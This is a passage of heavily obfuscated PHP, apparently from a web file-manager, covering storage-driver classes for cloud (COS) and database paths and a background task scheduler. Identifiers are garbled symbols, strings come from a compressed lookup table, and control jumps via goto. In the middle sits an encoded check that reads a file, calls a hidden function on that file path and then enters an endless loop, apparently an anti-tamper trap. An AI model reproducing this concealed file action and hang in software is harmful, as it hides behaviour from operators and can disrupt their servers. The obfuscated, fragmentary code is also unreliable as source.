$ß¸€Éç¸ = $GLOBALS[$ì¼¯„“„[6]][$ì¼¯„“„[88]][$ì¼¯„“„[1846]] == 1; $Ğæş¦¡— = $ß¸€Éç¸ ? 3 : 2; foreach ($÷èÆ¯¤À as $¬‹òĞèÁ) { if ($¬‹òĞèÁ[$ì¼¯„“„[1746]] == $ÄŞğ¿Äº) { return 0; } $·ˆğÔÂ¾ = explode($ì¼¯„“„[47], trim($¬‹òĞèÁ[$ì¼¯„“„[515]], $ì¼¯„“„[47])); if ($·ˆğÔÂ¾[0] == $ì¼¯„“„[191] && count($·ˆğÔÂ¾) > $Ğæş¦¡—) { $‹¬Ûİ©Ú = array_reverse(array_slice($·ˆğÔÂ¾, $Ğæş¦¡—)); $£®š±æ = array_search($ÄŞğ¿Äº, $‹¬Ûİ©Ú); if ($£®š±æ !== !1 && $£®š±æ + 1 <= $¸æş‚±İ) { $¸æş‚±İ = $£®š±æ + 1; } } } return $¸æş‚±İ; } private function userGroupList($´Î“˜›’ = false) { $°¨æË÷å =& $_SERVER[ÏÒ Ì„]; static $¬ˆÛ‰“ = array(); if (isset($¬ˆÛ‰“[$´Î“˜›’])) { return $¬ˆÛ‰“[$´Î“˜›’]; } $‘Äí£»ñ = Model($°¨æË÷å[532])->getInfo($´Î“˜›’); $¬ˆÛ‰“[$´Î“˜›’] = array_to_keyvalue($‘Äí£»ñ[$°¨æË÷å[1926]], $°¨æË÷å[1746]); return $¬ˆÛ‰“[$´Î“˜›’]; } public function userGroupParents($¼êÂšãî) { $·øÓ‡÷Á =& $_SERVER[ÏÒ Ì„]; static $Ã¸´«ÑŞ = array(); $¼êÂšãî = $¼êÂšãî ? $¼êÂšãî : USER_ID; if (isset($Ã¸´«ÑŞ[$¼êÂšãî])) { return $Ã¸´«ÑŞ[$¼êÂšãî]; } $¢‘ÌÓòÕ = $this->userGroupList($¼êÂšãî); $¬ãåô»Ã = array(); $‚¨×ƒïœ = $GLOBALS[$·øÓ‡÷Á[6]][$·øÓ‡÷Á[88]][$·øÓ‡÷Á[1846]] == 1; $Ç•¶á­â = $‚¨×ƒïœ ? 3 : 2; foreach ($¢‘ÌÓòÕ as $·ªÚêªà) { $Äãó·Ğı = array($·ªÚêªà[$·øÓ‡÷Á[1746]]); $áşíÉå = explode($·øÓ‡÷Á[47], trim($·ªÚêªà[$·øÓ‡÷Á[515]], $·øÓ‡÷Á[47])); if ($áşíÉå[0] == $·øÓ‡÷Á[191] && count($áşíÉå) > $Ç•¶á­â) { $ì®Ü¥Ô = array_slice($áşíÉå, $Ç•¶á­â); $Äãó·Ğı = array_merge($Äãó·Ğı, array_reverse($ì®Ü¥Ô)); } $¬ãåô»Ã = array_merge($¬ãåô»Ã, $Äãó·Ğı); } $Ã¸´«ÑŞ[$¼êÂšãî] = array_unique($¬ãåô»Ã); return $Ã¸´«ÑŞ[$¼êÂšãî]; } public function authTargetInfoMake($¥şó¹ğÈ) { $­±êš§² =& $_SERVER[ÏÒ Ì„]; $‹À•Ç‹ú = array(); $ª¿»ùà† = array(); foreach ($¥şó¹ğÈ as $ÏåØ¸£) { if ($ÏåØ¸£[$­±êš§²[406]] == SourceModel::TYPE_USER) { $‹À•Ç‹ú[] = intval($ÏåØ¸£[$­±êš§²[498]]); } else { if ($ÏåØ¸£[$­±êš§²[406]] == SourceModel::TYPE_GROUP) { $ª¿»ùà†[] = intval($ÏåØ¸£[$­±êš§²[498]]); } } } if ($‹À•Ç‹ú) { $‹À•Ç‹ú = Model($­±êš§²[507])->userListInfo($‹À•Ç‹ú); } if ($ª¿»ùà†) { $Øô¤Œ½¢ = array($­±êš§²[1833] => array($­±êš§²[413], $ª¿»ùà†)); $ª¿»ùà† = Model($­±êš§²[516])->field($­±êš§²[1955])->where($Øô¤Œ½¢)->select(); $ª¿»ùà† = array_to_keyvalue($ª¿»ùà†, $­±êš§²[1746]); } return array($­±êš§²[1956] => $‹À•Ç‹ú, $­±êš§²[1957] => $ª¿»ùà†); } public function authInfo($òŸŸÎÁ) { $„İíŒÑå =& $_SERVER[ÏÒ Ì„]; if ($òŸŸÎÁ[$„İíŒÑå[1849]]) { $¶À‚òŞ = Model($„İíŒÑå[501])->listData($òŸŸÎÁ[$„İíŒÑå[1849]]); if (!$¶À‚òŞ) { return !1; $ÁÆÌ…‹ = Model($„İíŒÑå[501])->listData(); $»òªÇÇŒ = array_filter_by_field($ÁÆÌ…‹, $„İíŒÑå[408], $„İíŒÑå[191]); return $»òªÇÇŒ; } $Æ¨½ùç = array_field_key($¶À‚òŞ, array($„İíŒÑå[395], $„İíŒÑå[28], $„İíŒÑå[408], $„İíŒÑå[1768], $„İíŒÑå[1769])); $Æ¨½ùç[$„İíŒÑå[1958]] = $òŸŸÎÁ; return $Æ¨½ùç; } else { return array($„İíŒÑå[414] => 0, $„İíŒÑå[1752] => $òŸŸÎÁ[$„İíŒÑå[1903]], $„İíŒÑå[415] => $„İíŒÑå[33], $„İíŒÑå[1768] => $„İíŒÑå[1959]); } } } goto eÍªùÛ´«; FÛÒ±±¿á„: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($‡¤İÇ) { parent::__construct($‡¤İÇ); $this->signatureVersion($_SERVER[ÏÒ Ì„][212]); } public function uploadFormData($ë‰–£‘, $¬ÊµÒÇî = 3600) { $¬’ú¡•ª =& $_SERVER[ÏÒ Ì„]; $Å„§²‰ = $¬’ú¡•ª[192]; $›ş²¼§ = $¬’ú¡•ª[230]; $Ò‘²óşÔ = $¬’ú¡•ª[1234]; $çê¬¤˜ß = gmdate($¬’ú¡•ª[1235], time() + $¬ÊµÒÇî); $”ˆï‹äÁ = (string) time() . $¬’ú¡•ª[68] . (string) (time() + $¬ÊµÒÇî); $½­³«¬È = array($¬’ú¡•ª[1236] => $çê¬¤˜ß, $¬’ú¡•ª[1237] => array(array($¬’ú¡•ª[1238] => $Å„§²‰), array($¬’ú¡•ª[1239] => $this->bucket), array($¬’ú¡•ª[1240], $¬’ú¡•ª[1241], $¬’ú¡•ª[33]), array($¬’ú¡•ª[1242] => $Ò‘²óşÔ), array($¬’ú¡•ª[1243] => $›ş²¼§), array($¬’ú¡•ª[1244] => $this->accessKey), array($¬’ú¡•ª[1245] => $”ˆï‹äÁ))); $½­³«¬È = json_encode($½­³«¬È); $œÏåÉÇ = hash_hmac($¬’ú¡•ª[230], $”ˆï‹äÁ, $this->secret); $õ…É–‡ = sha1($½­³«¬È); $Ïõ¼ì¡‰ = hash_hmac($¬’ú¡•ª[230], $õ…É–‡, $œÏåÉÇ); $‚•ú—œ‹ = array($¬’ú¡•ª[1238] => $Å„§²‰, $¬’ú¡•ª[1242] => $Ò‘²óşÔ, $¬’ú¡•ª[1246] => base64_encode($½­³«¬È), $¬’ú¡•ª[1243] => $›ş²¼§, $¬’ú¡•ª[1244] => $this->accessKey, $¬’ú¡•ª[1247] => $”ˆï‹äÁ, $¬’ú¡•ª[1248] => $Ïõ¼ì¡‰, $¬’ú¡•ª[175] => $this->getHost()); return $‚•ú—œ‹; } public function fileOutLink($õÛîƒ©ë) { $±†“Ú—š =& $_SERVER[ÏÒ Ì„]; if (substr($õÛîƒ©ë, 0, 7) == $±†“Ú—š[1249]) { $õÛîƒ©ë = $±†“Ú—š[1250] . substr($õÛîƒ©ë, 7); } header($±†“Ú—š[159] . $õÛîƒ©ë); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ĞïÆâÉ÷) { $this->pathParse = $ĞïÆâÉ÷; $this->model = Model($_SERVER[ÏÒ Ì„][1251]); } public function getPath($µ›„“õÏ) { return trim($µ›„“õÏ, $_SERVER[ÏÒ Ì„][8]); } public function pathFather($”¦¢¬À„) { $÷Ÿ±ëçŞ = $this->parse($”¦¢¬À„); $÷Ÿ±ëçŞ = $this->infoSimple($”¦¢¬À„); return $÷Ÿ±ëçŞ ? $÷Ÿ±ëçŞ[$_SERVER[ÏÒ Ì„][492]] : !1; } public function pathThis($İÓ¢„—˜) { $Ô¯°ù¸ƒ = $this->infoSimple($İÓ¢„—˜); return $Ô¯°ù¸ƒ ? $Ô¯°ù¸ƒ[$_SERVER[ÏÒ Ì„][28]] : !1; } public function getPathOuter($—ÍÒÙÇ») { if (!$—ÍÒÙÇ») { return $—ÍÒÙÇ»; } $®ùÒ˜ò© = $this->parse($—ÍÒÙÇ»); return KodIO::make($®ùÒ˜ò©[$_SERVER[ÏÒ Ì„][395]]); } public function copyFolderFromIO($£†óÓÏ, $²·ô°„Ë, $¼ıïÃµÀ, $´•µç ¿, $¯åêÄÄ´) { $í»§€å¤ = $this->model->copyFolderFromIO($£†óÓÏ, $²·ô°„Ë, $¼ıïÃµÀ, $´•µç ¿, $¯åêÄÄ´); return KodIO::make($í»§€å¤); } public function isParentOf($ıò´ªŠ³, $â¡²­¿ı) { return $this->model->isParentOf($ıò´ªŠ³, $â¡²­¿ı); } public function mkfile($õµõÍƒ¯, $ÅÖ ÁÎÅ = '', $êÁûî¯† = REPEAT_RENAME) { $ ªš­«Ò =& $_SERVER[ÏÒ Ì„]; $Ô´©šá­ = $this->parse($õµõÍƒ¯); $õµõÍƒ¯ = $Ô´©šá­[$ ªš­«Ò[395]]; for ($ù »±Ì  = 0; $ù »±Ì  < count($Ô´©šá­[$ ªš­«Ò[1252]]); $ù »±Ì ++) { $šåšÄ¬ = $Ô´©šá­[$ ªš­«Ò[1252]][$ù »±Ì ]; if ($ù »±Ì  == count($Ô´©šá­[$ ªš­«Ò[1252]]) - 1) { $õµõÍƒ¯ = $this->model->mkfile($õµõÍƒ¯, $šåšÄ¬, $ÅÖ ÁÎÅ, $êÁûî¯†); break; } $õµõÍƒ¯ = $this->model->mkdir($õµõÍƒ¯, $šåšÄ¬, REPEAT_SKIP); } return $this->getPathOuter($õµõÍƒ¯); } public function mkdir($†İÜ©½Ë, $ó‰ºæ“ = REPEAT_SKIP) { $ú’‚Ø¿İ =& $_SERVER[ÏÒ Ì„]; $Öò«‚š = $this->parse($†İÜ©½Ë); $†İÜ©½Ë = $Öò«‚š[$ú’‚Ø¿İ[395]]; for ($‚°‚©¢° = 0; $‚°‚©¢° < count($Öò«‚š[$ú’‚Ø¿İ[1252]]); $‚°‚©¢°++) { $ÂÑä íÇ = $Öò«‚š[$ú’‚Ø¿İ[1252]][$‚°‚©¢°]; $†İÜ©½Ë = $this->model->mkdir($†İÜ©½Ë, $ÂÑä íÇ, $ó‰ºæ“); } return $this->getPathOuter($†İÜ©½Ë); } public function copyFile($Õ¤¨÷ä, $­¡©ô³’, $ßÖß´Ç = REPEAT_REPLACE) { $âÜ›‡êÈ =& $_SERVER[ÏÒ Ì„]; $­ø¨˜Ü = $this->parse($­¡©ô³’); $œÅıØ¿õ = $this->model->copy($Õ¤¨÷ä, $­ø¨˜Ü[$âÜ›‡êÈ[395]], $ßÖß´Ç, $­ø¨˜Ü[$âÜ›‡êÈ[76]]); return $œÅıØ¿õ ? $this->getPathOuter($œÅıØ¿õ) : !1; } public function moveFile($åƒŒíÓğ, $ï©ö•õ½, $˜ÙÍ“ = REPEAT_REPLACE) { $Æ¥âòóˆ =& $_SERVER[ÏÒ Ì„]; $áóÊ‹£ì = $this->parse($ï©ö•õ½); $Òå˜ŞúÖ = $this->model->move($åƒŒíÓğ, $áóÊ‹£ì[$Æ¥âòóˆ[395]], $˜ÙÍ“, $áóÊ‹£ì[$Æ¥âòóˆ[76]]); return $Òå˜ŞúÖ ? $this->getPathOuter($Òå˜ŞúÖ) : !1; } public function copy($¯Ëå¹Òã, $€ªÏ´Ë, $¦ÑêÇ­” = REPEAT_REPLACE, $äÎùõ²‰ = false) { $†”–Óé» = $this->parse($€ªÏ´Ë); $‘äÌà„ = $this->model->copy($¯Ëå¹Òã, $†”–Óé»[$_SERVER[ÏÒ Ì„][395]], $¦ÑêÇ­”, $äÎùõ²‰); return $‘äÌà„ ? $this->getPathOuter($‘äÌà„) : !1; } public function moveSameAllow() { } public function move($Üá¤ªÈÒ, $Ò¡Õ¥ñö, $£¾îùºÖ = REPEAT_REPLACE, $–Ñ½ã¶Ì = false) { $öñ£Ìï = $this->parse($Ò¡Õ¥ñö); $¶Ó…­† = $this->model->move($Üá¤ªÈÒ, $öñ£Ìï[$_SERVER[ÏÒ Ì„][395]], $£¾îùºÖ, $–Ñ½ã¶Ì); return $¶Ó…­† ? $this->getPathOuter($¶Ó…­†) : !1; } public function remove($•æ‡´”“, $³—Á­¡ = true) { return $this->model->remove($•æ‡´”“, $³—Á­¡); } public function rename($ºêÜô ¶, $œÓ™Ÿ‡) { $áú«Õ¬ë = $this->model->rename($ºêÜô ¶, $œÓ™Ÿ‡); return $áú«Õ¬ë ? $this->getPathOuter($ºêÜô ¶) : $áú«Õ¬ë; } public function size($ô¿´®Ğ) { $¸³¹Ë·ä = $this->infoSimple($ô¿´®Ğ); return $¸³¹Ë·ä ? $¸³¹Ë·ä[$_SERVER[ÏÒ Ì„][78]] : 0; } public function infoSimple($ˆ›÷¨Å¦) { return $this->model->sourceInfo($ˆ›÷¨Å¦); } public function info($—¦Õ÷îÚ) { return $this->infoParse($—¦Õ÷îÚ); } public function infoAuth($Ã‘ŞÖãÌ) { return $this->infoParse($Ã‘ŞÖãÌ, !1, !0); } public function infoWithChildren($±ñüÄ³¯) { return $this->infoParse($±ñüÄ³¯, !0); } protected function infoParse($ï ÇçÈ¿, $´°½ãñ = false, $Ó¾‚¦¨® = false) { if (!$´°½ãñ) { return $this->model->pathInfo($ï ÇçÈ¿, $Ó¾‚¦¨®); } return $this->model->pathInfoMore($ï ÇçÈ¿); } public function infoFull($õòèÅ´ñ) { $¬õÖš Ö =& $_SERVER[ÏÒ Ì„]; $šÊêÂ¦× = explode($¬õÖš Ö[8], $õòèÅ´ñ); $Ö¡õ‰¥ = implode($¬õÖš Ö[8], array_splice($šÊêÂ¦×, 1)); return $this->model->pathInfoByPath($šÊêÂ¦×[0], $Ö¡õ‰¥); } public function hashSimple($’ÜĞ‚æ) { $šÊ ºÚ˜ =& $_SERVER[ÏÒ Ì„]; $ĞúèÕê˜ = $this->infoWithChildren($’ÜĞ‚æ); return $ĞúèÕê˜[$šÊ ºÚ˜[164]][$šÊ ºÚ˜[171]]; } public function hashMd5($Á§ğç±ñ) { $µÁº—Ïª =& $_SERVER[ÏÒ Ì„]; $æŸ”÷†Æ = $this->infoWithChildren($Á§ğç±ñ); return $æŸ”÷†Æ[$µÁº—Ïª[164]][$µÁº—Ïª[170]]; } public function exist($¹Êğµ„Á) { $•°êü©Ø =& $_SERVER[ÏÒ Ì„]; $¨ –’ÏĞ = $this->parse($¹Êğµ„Á); if (!$¨ –’ÏĞ[$•°êü©Ø[76]]) { return $this->isFile($¹Êğµ„Á) || $this->isFolder($¹Êğµ„Á); } $Í…€ï©¤ = array($•°êü©Ø[396] => $¨ –’ÏĞ[$•°êü©Ø[395]], $•°êü©Ø[28] => $¨ –’ÏĞ[$•°êü©Ø[76]]); $˜ş”›¯Í = $this->model->where($Í…€ï©¤)->find(); return $˜ş”›¯Í ? !0 : !1; } public function isFile($–ˆç™£) { $­£«º¾ =& $_SERVER[ÏÒ Ì„]; $«¾ú‰§¼ = $this->infoSimple($–ˆç™£); return $«¾ú‰§¼ && $«¾ú‰§¼[$­£«º¾[405]] == $­£«º¾[87] ? !1 : !0; } public function isFolder($Ø˜‰£·Œ) { $ÆÑÁ†‰ =& $_SERVER[ÏÒ Ì„]; $Ü‡Éœ›µ = $this->infoSimple($Ø˜‰£·Œ); return $Ü‡Éœ›µ && $Ü‡Éœ›µ[$ÆÑÁ†‰[405]] == $ÆÑÁ†‰[87] ? !0 : !1; } public function listPath($®ÎÒéÇ”, $÷Ÿßµíà = false) { $ü¹¢ÆÀî =& $_SERVER[ÏÒ Ì„]; if ($®ÎÒéÇ” == $ü¹¢ÆÀî[33]) { return !1; } $œäÎê´ã = array($ü¹¢ÆÀî[396] => $®ÎÒéÇ”); if ($÷Ÿßµíà) { return $this->model->listSource($œäÎê´ã, -1); } return $this->model->listSource($œäÎê´ã); } public function has($Ã ‹¬ÒÖ, $ ëÓµ¹® = false, $¶ø°ìü¥ = null) { $¨ñ©Â¼Ó =& $_SERVER[ÏÒ Ì„]; $‰Ø×ß« = $this->infoWithChildren($Ã ‹¬ÒÖ); if ($ ëÓµ¹®) { return array($¨ñ©Â¼Ó[204] => $‰Ø×ß«[$¨ñ©Â¼Ó[204]], $¨ñ©Â¼Ó[203] => $‰Ø×ß«[$¨ñ©Â¼Ó[203]]); } return $¶ø°ìü¥ ? $‰Ø×ß«[$¨ñ©Â¼Ó[204]] : $‰Ø×ß«[$¨ñ©Â¼Ó[203]]; } public function listAll($ÇÙ™­ô) { $±Œ©õÕÈ = IO::info($this->pathParse[$_SERVER[ÏÒ Ì„][76]]); if (!$±Œ©õÕÈ) { return array(); } return $this->model->listAll($ÇÙ™­ô); } public function getContent($Â¤ ²Ñ) { return $this->model->getContent($Â¤ ²Ñ); } public function setContent($ŞÜ¶‚Ñ, $µñĞêÆì = '') { return $this->model->setContent($ŞÜ¶‚Ñ, $µñĞêÆì); } public function fileSubstr($Ü¨æŠÏ, $›¶şÃ, $ËíÇçœ) { return $this->model->fileSubstr($Ü¨æŠÏ, $›¶şÃ, $ËíÇçœ); } public function download($Ò•Ñ»¤´, $÷Š…îÓÒ = '') { $¢©Ñ Û = get_path_father($÷Š…îÓÒ); $î®âùÌÛ = get_path_this($÷Š…îÓÒ); $ÏïÃĞãô = $this->model->fileInfoGet($Ò•Ñ»¤´); $ğœ‚şæ´ = IO::copy($ÏïÃĞãô[$_SERVER[ÏÒ Ì„][76]], $¢©Ñ Û, !1, $î®âùÌÛ); return $ğœ‚şæ´; } public function setModifyTime($¨Úº“Ì, $åëËÕ©ä = '') { $áá·º³÷ =& $_SERVER[ÏÒ Ì„]; if (!$¨Úº“Ì) { return; } $this->model->where(array($áá·º³÷[412] => $¨Úº“Ì))->save(array($áá·º³÷[84] => $åëËÕ©ä)); } public function upload($İü‘×èï, $ÂÙ´®İ˜, $à¡ÈöÕÄ = false, $âé€˜™Ğ = REPEAT_REPLACE) { $ƒš†Ó­ƒ =& $_SERVER[ÏÒ Ì„]; $úâãŒÅÚ = $this->parse($İü‘×èï); $Ã€¤‚°ç = $this->model->addFile($úâãŒÅÚ[$ƒš†Ó­ƒ[395]], $ÂÙ´®İ˜, $úâãŒÅÚ[$ƒš†Ó­ƒ[76]], $à¡ÈöÕÄ, $âé€˜™Ğ); return $this->getPathOuter($Ã€¤‚°ç); } public function uploadFileByID($‹ŸŠ‹¦Á, $ıÈ½Ñ¬ , $¤Ššô¢Î) { $ƒôô´áÎ =& $_SERVER[ÏÒ Ì„]; $˜‚µ¦ù = $this->parse($‹ŸŠ‹¦Á); $À‚ñÈ²Ğ = $this->model->addFileByFileID($˜‚µ¦ù[$ƒôô´áÎ[395]], $ıÈ½Ñ¬ , $˜‚µ¦ù[$ƒôô´áÎ[76]], $¤Ššô¢Î); return $this->getPathOuter($À‚ñÈ²Ğ); } public function addFileByRemote($êòæ¬¹×, $ç¼¼Ÿ¥„, $‹ú¦€àå = array(), $™õ”Û—£ = '', $óşÄ¼¦) { $Ä²£ˆ¨ =& $_SERVER[ÏÒ Ì„]; $â¿ˆÃôû = $this->parse($êòæ¬¹×); $™õ”Û—£ = empty($™õ”Û—£) ? $â¿ˆÃôû[$Ä²£ˆ¨[76]] : $™õ”Û—£; $Í©Æíğ = $this->model->addFileByRemote($â¿ˆÃôû[$Ä²£ˆ¨[395]], $ç¼¼Ÿ¥„, $™õ”Û—£, $‹ú¦€àå, $óşÄ¼¦); return $this->getPathOuter($Í©Æíğ); } public function uploadLink($Ìš¹³ø™, $ÜŠ·´›Š = 0) { $¨ôÕå¢š =& $_SERVER[ÏÒ Ì„]; $½é—¼Ó… = $this->parse($Ìš¹³ø™); $µ²ÃôÆ = _get($GLOBALS[$¨ôÕå¢š[7]], $¨ôÕå¢š[1253]); $èîñˆ = _get($GLOBALS[$¨ôÕå¢š[7]], $¨ôÕå¢š[1254]); $Ìš¹³ø™ = Model($¨ôÕå¢š[597])->createFileName($½é—¼Ó…[$¨ôÕå¢š[76]], $µ²ÃôÆ, $èîñˆ); return IO::uploadLink($Ìš¹³ø™, $ÜŠ·´›Š); } public function fileNameAuto($ÄÔß•Çå, $ë»¨™çá, $ôÒ¦ÎÕ = REPEAT_REPLACE, $†óĞ¡€­ = false) { return $this->model->fileNameAuto($ÄÔß•Çå, $ë»¨™çá, $ôÒ¦ÎÕ, $†óĞ¡€­); } public function fileNameExist($ñ„ó¡ùÕ, $ƒã„šş) { return $this->model->fileNameExist($ñ„ó¡ùÕ, $ƒã„šş); } protected function _fileOut($ËÈâÆ˜Í, $ ÷ç“ƒŞ = false, $¶»¬Çø† = false, $±Õçú‡Ü = '', $Áõ‹Êèã = false) { $ìÆÆÆ¶— =& $_SERVER[ÏÒ Ì„]; $»ÎğÖ×º = $this->model->sourceInfo($ËÈâÆ˜Í); if ($»ÎğÖ×º[$ìÆÆÆ¶—[405]] == $ìÆÆÆ¶—[87]) { header($ìÆÆÆ¶—[1255]); die; } $¬úŸÌ³Š = $this->model->fileInfoGet($ËÈâÆ˜Í); $±Õçú‡Ü = $¬úŸÌ³Š[$ìÆÆÆ¶—[170]] ? $¬úŸÌ³Š[$ìÆÆÆ¶—[170]] : $±Õçú‡Ü; $ïóœâŠÏ = isset($GLOBALS[$ìÆÆÆ¶—[1256]]) ? $GLOBALS[$ìÆÆÆ¶—[1256]] : $»ÎğÖ×º[$ìÆÆÆ¶—[28]]; if ($Áõ‹Êèã) { return IO::fileOutServer($¬úŸÌ³Š[$ìÆÆÆ¶—[76]], $ ÷ç“ƒŞ, $ïóœâŠÏ, $±Õçú‡Ü); } IO::fileOut($¬úŸÌ³Š[$ìÆÆÆ¶—[76]], $ ÷ç“ƒŞ, $ïóœâŠÏ, $±Õçú‡Ü); } public function fileOut($ßÖ•¦ñ¨, $Ç¹–íâ = false, $±ìÓ„Û = false, $Î”Î‡„ = '') { $this->_fileOut($ßÖ•¦ñ¨, $Ç¹–íâ, $±ìÓ„Û, $Î”Î‡„); } public function fileOutServer($ƒ’Öà„ã, $Ï€ûìµ… = false, $€ˆã×´ = false, $ÙöÁÛÔ¤ = '') { $this->_fileOut($ƒ’Öà„ã, $Ï€ûìµ…, $€ˆã×´, $ÙöÁÛÔ¤, !0); } protected function _fileOutImage($ã®ËğÄ, $ÌàåçÀÖ = 250) { $ÔÎ×›¹Ş =& $_SERVER[ÏÒ Ì„]; $ º™Ÿ§µ = $this->model->pathInfo($ã®ËğÄ); if ($ º™Ÿ§µ[$ÔÎ×›¹Ş[405]] == $ÔÎ×›¹Ş[87]) { show_json($ÔÎ×›¹Ş[1257] . $ã®ËğÄ, !1); } $×Êğ¼¢¼ = $this->model->fileInfoGet($ã®ËğÄ); $×Êğ¼¢¼[$ÔÎ×›¹Ş[28]] = $ º™Ÿ§µ[$ÔÎ×›¹Ş[28]]; $×Êğ¼¢¼[$ÔÎ×›¹Ş[163]] = $ º™Ÿ§µ[$ÔÎ×›¹Ş[163]]; $GLOBALS[$ÔÎ×›¹Ş[1256]] = $×Êğ¼¢¼[$ÔÎ×›¹Ş[28]]; $GLOBALS[$ÔÎ×›¹Ş[162]] = $×Êğ¼¢¼; IO::fileOutImage($×Êğ¼¢¼[$ÔÎ×›¹Ş[76]], $ÌàåçÀÖ); } public function fileOutImage($Õ‚–ãÔô, $æã¾½°€ = 250) { $this->_fileOutImage($Õ‚–ãÔô, $æã¾½°€); } public function fileOutImageServer($¹£˜á“Ì, $·ŠÚÂäá = 250) { $this->_fileOutImage($¹£˜á“Ì, $·ŠÚÂäá); } public function link($ä­ã½‹÷, $Ä©Ú¼›Ğ = '') { $àòÌËƒ¯ = $this->model->fileInfoGet($ä­ã½‹÷); return IO::link($àòÌËƒ¯[$_SERVER[ÏÒ Ì„][76]], $Ä©Ú¼›Ğ); } protected function parse($ù’”ëœ) { $‘³ ¡Ô =& $_SERVER[ÏÒ Ì„]; if (strstr($ù’”ëœ, $‘³ ¡Ô[8]) === !1) { return array($‘³ ¡Ô[414] => intval($ù’”ëœ), $‘³ ¡Ô[76] => $‘³ ¡Ô[33], $‘³ ¡Ô[1252] => array()); } $²¥ù®†— = explode($‘³ ¡Ô[8], trim($ù’”ëœ, $‘³ ¡Ô[8])); if (count($²¥ù®†—) < 2) { show_tips(clear_html($ù’”ëœ) . $‘³ ¡Ô[1258]); } return array($‘³ ¡Ô[414] => intval($²¥ù®†—[0]), $‘³ ¡Ô[76] => $²¥ù®†—[1], $‘³ ¡Ô[1252] => array_slice($²¥ù®†—, 1)); } } if (!isset($_SERVER[$_SERVER[ÏÒ Ì„][871]]) || !isset($_SERVER[$_SERVER[ÏÒ Ì„][869]])) { $_getc = $_SERVER[ÏÒ Ì„][873]; $_getfile = $_SERVER[$_SERVER[ÏÒ Ì„][874]] . $_SERVER[ÏÒ Ì„][875]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÏÒ Ì„][229], $_getfilec); if (count($_getarrs) < $_SERVER[ÏÒ Ì„][644]) { $exit = $_SERVER[ÏÒ Ì„][876]; $exit(); } $_act = $_SERVER[ÏÒ Ì„][1259]; $_act($_SERVER[$_SERVER[ÏÒ Ì„][874]] . $_SERVER[ÏÒ Ì„][875]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ÏÒ Ì„][376]); } } goto cÍÎš¦´š; dˆ›æÙ¹‰Ù: define($_SERVER[ÏÒ Ì„][236], 1); define($_SERVER[ÏÒ Ì„][237], 2); define($_SERVER[ÏÒ Ì„][238], 3); goto c¢ñîŠ˜Ò; eÚÔ¥“ö”: $_SERVER[º‚ØÇıÁ] = explode($_SERVER[ÏÒ Ì„][601], gzinflate(substr($_SERVER[ÏÒ Ì„][602], 10, -8))); $xoyepnrgkd = $_SERVER[ÏÒ Ì„][603]; if (!$xoyepnrgkd) { die; } goto A«Û£»“©à; C²÷ĞŠ…õ¹: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ìğüæŠ¡ =& $_SERVER[ÏÒ Ì„]; if (self::valueGet($ìğüæŠ¡[740]) != $ìğüæŠ¡[87]) { return; } if (self::valueGet($ìğüæŠ¡[1538]) == $ìğüæŠ¡[87]) { $¬î«¤£ = self::valueGet($ìğüæŠ¡[1539]); if (time() - $¬î«¤£ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($ìğüæŠ¡[1538], $ìğüæŠ¡[87]); self::log($ìğüæŠ¡[1540]); Hook::bind($ìğüæŠ¡[1541], $ìğüæŠ¡[1542]); $¥ÜİÕÚÉ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ìğüæŠ¡[740]) != $ìğüæŠ¡[87]) { self::valueSet($ìğüæŠ¡[1538], $ìğüæŠ¡[191]); self::log($ìğüæŠ¡[1543]); die; } $Ø§êÛÇ³ = time(); if ($Ø§êÛÇ³ - $¥ÜİÕÚÉ >= 60) { self::valueSet(array($ìğüæŠ¡[1538] => $ìğüæŠ¡[87], $ìğüæŠ¡[1539] => $Ø§êÛÇ³), !1); $¥ÜİÕÚÉ = $Ø§êÛÇ³; } if (!file_exists(USER_SYSTEM . $ìğüæŠ¡[1544])) { self::valueSet(array($ìğüæŠ¡[1538] => $ìğüæŠ¡[191], $ìğüæŠ¡[740] => $ìğüæŠ¡[191]), !1); self::log($ìğüæŠ¡[1545]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ÎßÅŞû™ =& $_SERVER[ÏÒ Ì„]; http_close(); self::valueSet($ÎßÅŞû™[740], $ÎßÅŞû™[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ÎßÅŞû™[1538] => $ÎßÅŞû™[191], $ÎßÅŞû™[740] => $ÎßÅŞû™[87]), !1); } public static function shutdownEvent() { $´›Àœ¹¤ =& $_SERVER[ÏÒ Ì„]; self::valueSet($´›Àœ¹¤[1538], $´›Àœ¹¤[191]); self::log($´›Àœ¹¤[1546]); } public static function config($ı×æé‰¤, $‚Ó£Š³‘) { self::valueSet($_SERVER[ÏÒ Ì„][740], $ı×æé‰¤); } private static function taskRunAll() { $‘òÃ€Œ‡ =& $_SERVER[ÏÒ Ì„]; $¹ŸšÁÛË = timeFloat(); $££ıµıÃ = Model($‘òÃ€Œ‡[1547])->listData(); $°†¶°¿³ = count($££ıµıÃ); for ($ıòÂ¤Îù = 0; $ıòÂ¤Îù < $°†¶°¿³; $ıòÂ¤Îù++) { $³ŒÓİœÊ = $££ıµıÃ[$ıòÂ¤Îù]; if (!$³ŒÓİœÊ[$‘òÃ€Œ‡[395]] || $³ŒÓİœÊ[$‘òÃ€Œ‡[1548]] != $‘òÃ€Œ‡[87]) { continue; } if (!self::taskTimeCheck($³ŒÓİœÊ)) { continue; } self::taskRun($³ŒÓİœÊ); } Hook::trigger($‘òÃ€Œ‡[1549]); self::taskQueueRun($¹ŸšÁÛË); } private static function taskQueueRun($¡½Æ²›¢) { $ïş‹® = 10; while (!0) { $Ä³Øè¿ = TaskQueue::run(); if ($Ä³Øè¿ === !1) { break; } if (timeFloat() - $¡½Æ²›¢ >= $ïş‹®) { break; } } } private static function taskTimeCheck($ÃÉéÍ©) { $Ğ–¦øôı =& $_SERVER[ÏÒ Ì„]; $€»ÌÖÅ¤ = json_decode($ÃÉéÍ©[$Ğ–¦øôı[197]], !0); $±Œ¦¢ß = intval($ÃÉéÍ©[$Ğ–¦øôı[1539]]); $ÜË³šŸ¾ = strtotime($Ğ–¦øôı[1550] . $€»ÌÖÅ¤[$Ğ–¦øôı[1551]] . 